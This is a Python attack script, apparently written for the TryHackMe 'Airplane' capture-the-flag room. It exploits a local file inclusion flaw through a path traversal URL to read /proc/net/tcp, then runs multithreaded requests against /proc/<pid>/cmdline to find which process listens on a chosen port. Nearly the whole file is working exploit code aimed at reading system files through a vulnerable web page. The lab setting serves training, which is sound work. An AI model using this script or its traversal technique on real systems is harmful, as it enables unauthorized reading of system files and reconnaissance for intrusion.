import requests
import threading
import argparse
from queue import Queue

# Function to fetch command line for a given PID
def fetch_cmdline(q, base_url, port):
    while not q.empty():
        pid = q.get()
        try:
            response = requests.get(base_url.format(pid))
            content = response.content.decode('utf-8').replace('\x00', ' ')
            if "Page not found" not in content and content.strip():
                if f"{port}" in content:
                    print(f"\nThe service running on port {port} is: {content}")
                    # Clear remaining queue items and break out of the loop
                    while not q.empty():
                        q.get()
                        q.task_done()
                    break
        except Exception as e:
            print(f"Error fetching PID {pid}: {e}")
        q.task_done()

# Function to get the inode of the service running on the specified port
def get_service_info(target_path, port_hex):
    url = f"{target_path}/net/tcp"
    response = requests.get(url)
    if response.status_code == 200:
        lines = response.text.split('\n')
        for line in lines:
            fields = line.strip().split()
            if len(fields) > 1 and fields[1].endswith(port_hex):
                inode = fields[9]
                return inode
        print(f"No service info found for port {int(port_hex, 16)} in {url}")
    else:
        print(f"Failed to retrieve {url}, status code: {response.status_code}")
    return None

if __name__ == "__main__":
    # Argument parsing
    parser = argparse.ArgumentParser(
        description='This is a script that will use LFI to identify a service running on a port. '
                    'This was created while going through the "Airplane" room on TryHackMe. '
                    'A big thank you to n3ph0s (https://www.nephos.guru/) for sharing his original base script with me, '
                    'this is built off of his.'
    )
    parser.add_argument('-p', '--port', type=int, required=True, help='Port number to identify the service running on')
    parser.add_argument('-t', '--threads', type=int, required=True, help='Number of threads to use')
    args = parser.parse_args()

    # Static base URL for the target with LFI vulnerability
    target_path = "http://airplane.thm:8000/?page=../../../../../../proc"

    # Prepare base URL for fetching command lines
    base_url = f"{target_path}/{{}}/cmdline"

    # Convert port number to hexadecimal
    port_hex = f'{args.port:X}'

    # Get inode of the service running on the specified port
    inode = get_service_info(target_path, port_hex)

    if inode:
        q = Queue()

        # Enqueue all PIDs to the queue
        for i in range(1, 1001):
            q.put(i)

        # Create and start threads
        threads = []
        for _ in range(args.threads):
            t = threading.Thread(target=fetch_cmdline, args=(q, base_url, args.port))
            t.start()
            threads.append(t)

        # Wait for all threads to finish
        q.join()

        # Ensure all threads have finished
        for t in threads:
            t.join()

        print("Finished fetching all PIDs.")
    else:
        print("Failed to retrieve inode from the target.")
